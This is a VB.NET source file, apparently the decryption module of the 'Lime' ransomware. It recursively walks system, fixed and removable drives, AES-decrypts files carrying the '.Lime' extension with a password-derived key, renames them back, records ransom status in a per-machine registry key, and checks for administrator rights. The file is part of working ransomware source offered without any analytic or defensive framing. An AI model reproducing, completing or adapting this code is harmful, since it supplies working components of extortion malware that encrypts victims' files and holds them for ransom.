Imports System.IO
Imports System.Security.Cryptography

Public Class Decryption
    Public Pass As String
    Private num
    Private userName As String = Environment.UserName
    Private C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3)
    Public Shared SPL As String = Main.SPL



    Public Sub BeforeDec()
        Dim D1 As Threading.Thread = New Threading.Thread(AddressOf Dec)
        D1.Start()
    End Sub



    Public Sub Dec(ByVal key As String)
        Try

            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-Status", "Decryption in progress...")

            Dim T1 As New Threading.Thread(AddressOf System_Driver)
            Dim T2 As New Threading.Thread(AddressOf Fix_Drivers)
            Dim T3 As New Threading.Thread(AddressOf OtherDrivers)

            T1.Start(Pass)
            T2.Start(Pass)
            T3.Start(Pass)


            Do Until num = 3
                Threading.Thread.Sleep(500)
            Loop

            num = Nothing
            Pass = Nothing
            Threading.Thread.CurrentThread.Sleep(1000)

            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-Status", "Decrypted")

            Try
                Main.CloseMe()
            Catch ex As Exception
            End Try

        Catch ex As Exception
        End Try


    End Sub

    Private Sub System_Driver(ByVal password As String)
        On Error Resume Next
        Dir_Dec(C_DIR, password)
        num += 1
    End Sub

    Private Sub Fix_Drivers(ByVal password As String)
        On Error Resume Next
        For Each drive In Environment.GetLogicalDrives
            Dim Driver As DriveInfo = New DriveInfo(drive)
            If Driver.DriveType = DriveType.Fixed AndAlso Not Driver.ToString.Contains(C_DIR) Then
                Dim DriverPath As String = drive
                Dir_Dec(DriverPath, password)
            End If
        Next
        num += 1
    End Sub

    Private Sub OtherDrivers(ByVal password As String)
        On Error Resume Next
        For Each drive In Environment.GetLogicalDrives
            Dim Driver As DriveInfo = New DriveInfo(drive)
            If Not Driver.DriveType = DriveType.Fixed AndAlso Not Driver.ToString.Contains(C_DIR) Then
                Dim DriverPath As String = drive
                Dir_Dec(DriverPath, password)
            End If
        Next
        num += 1
    End Sub

    Public Function AES_Dec(ByVal B2Dec As Byte(), ByVal KeyBytes As Byte()) As Byte()
        On Error Resume Next
        Dim DecBytes As Byte() = Nothing
        Dim saltBytes As Byte() = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
        Using ms As IO.MemoryStream = New MemoryStream()
            Using AES As RijndaelManaged = New RijndaelManaged()
                AES.KeySize = 256
                AES.BlockSize = 128
                Dim key = New Rfc2898DeriveBytes(KeyBytes, saltBytes, 1000)
                AES.Key = key.GetBytes(AES.KeySize / 8)
                AES.IV = key.GetBytes(AES.BlockSize / 8)
                AES.Mode = CipherMode.CBC
                Using cs = New CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write)
                    cs.Write(B2Dec, 0, B2Dec.Length)
                    cs.Close()
                End Using

                DecBytes = ms.ToArray()
            End Using
        End Using

        Return DecBytes
    End Function

    Public Sub File_Dec(ByVal file As String, ByVal key As String)
        On Error Resume Next
        If file.EndsWith(".Lime") Then
            Dim B2Dec As Byte() = IO.File.ReadAllBytes(file)
            Dim KeyBytes As Byte() = Text.Encoding.UTF8.GetBytes(key)
            KeyBytes = SHA256.Create().ComputeHash(KeyBytes)
            Dim BytesDec As Byte() = AES_Dec(B2Dec, KeyBytes)
            IO.File.WriteAllBytes(file, BytesDec)
            Dim exten As String = System.IO.Path.GetExtension(file)
            Dim result As String = file.Substring(0, file.Length - exten.Length)
            IO.File.Move(file, result)
        End If
    End Sub

    Public Sub Dir_Dec(ByVal ThePath As String, ByVal key As String)
        On Error Resume Next
        Dim files As String() = Directory.GetFiles(ThePath)
        Dim SubDirectories As String() = Directory.GetDirectories(ThePath)
        For i As Integer = 0 To files.Length - 1
            File_Dec(files(i), key)
        Next

        For i As Integer = 0 To SubDirectories.Length - 1
            Dir_Dec(SubDirectories(i), key)
        Next

    End Sub

    Public Shared Function Privileges() As Boolean
        Try
            Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
            Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
            If p.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
                Return True
            Else
                Return False
            End If
        Catch ex As Exception
            Return False
        End Try
    End Function

End Class
